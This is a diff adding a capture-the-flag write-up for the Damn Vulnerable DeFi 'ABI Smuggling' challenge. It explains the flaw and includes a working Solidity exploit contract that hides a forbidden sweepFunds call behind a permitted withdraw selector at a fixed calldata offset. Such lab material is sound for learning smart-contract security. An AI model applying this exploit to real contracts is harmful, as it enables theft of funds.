@@ -419,4 +419,51 @@ by tinamints
     }
 `
 
+## 15. ABI Smuggling
+### conditions :
+- rescue all 1M DVT from the vault to recovery
+### concepts :
+-  ABI smuggling
+-  calldata offset manipulation
+### solution :
+- `execute()` only checks permissions using the selector read from a hardcoded calldata offset (byte 100), not the real `actionData` offset. Craft calldata where the decoy `withdraw` selector sits at byte 100 (which the player IS permitted to call) while the offset field actually points further along to the real payload — a `sweepFunds` call (which the player is NOT permitted to call) — so the permission check passes on the decoy but the vault executes the smuggled action instead
+### POC
+` function test_abiSmuggling() public checkSolvedByPlayer {
+         Exploit exploit = new Exploit(address(vault),address(token),recovery);
+        bytes memory payload = exploit.executeExploit();
+        address(vault).call(payload);
+    }`
+
+`contract Exploit {
+    function executeExploit() external returns (bytes memory) {
+        bytes4 executeSelector = vault.execute.selector;
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+        bytes memory emptyData = abi.encodePacked(uint256(0));
+        bytes memory withdrawSelectorPadded = abi.encodePacked(
+            bytes4(0xd9caed12),
+            bytes28(0)
+        );
+        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            token
+        );
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+        bytes memory calldataPayload = abi.encodePacked(
+            executeSelector,
+            target,
+            dataOffset,
+            emptyData,
+            withdrawSelectorPadded,
+            actionDataLength,
+            sweepFundsCalldata
+        );
+
+        return calldataPayload;
+    }
+}`
+
 
